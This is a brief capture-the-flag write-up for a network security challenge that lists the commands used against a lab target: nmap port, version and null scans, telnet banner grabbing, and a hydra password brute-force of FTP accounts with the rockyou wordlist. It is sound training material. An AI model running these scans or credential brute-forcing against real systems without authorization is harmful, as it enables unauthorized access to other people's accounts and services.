# Net Sec Challenge

##  Questions & Answers

1. What is the highest port number being open less than 10,000?  
   ```bash
   sudo nmap -sS Target_IP -p-10000
   ```

2. There is an open port outside the common 1000 ports; it is above 10,000. What is it?  
   ```bash
   sudo nmap -sS Target_IP -p10000-
   ```

3. How many TCP ports are open?  
   ```bash
   sudo nmap -sS Target_IP -p-
   ```

4. What is the flag hidden in the HTTP server header?  
   ```text
   telnet Target_IP 80

   GET / HTTP/1.1
   host: telnet
   ```

5. What is the flag hidden in the SSH server header?  
   ```bash
   telnet Target_IP 22
   ```

6. We have an FTP server listening on a nonstandard port. What is the version of the FTP server?  
   ```bash
   sudo nmap -sV Target_IP -p-
   ```

7. We learned two usernames using social engineering: eddie and quinn.  
   What is the flag hidden in one of these two account files and accessible via FTP?  
   ```bash
   hydra -L usernames.txt -P ./rockyou.txt ftp://Target_IP:10021
   ```

   ```bash
   ftp Target_IP 10021
   ls
   get ftp_flag.txt
   ```

8. Browsing to http://Target_IP:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?  
   ```bash
   nmap -sN Target_IP -v
   ```
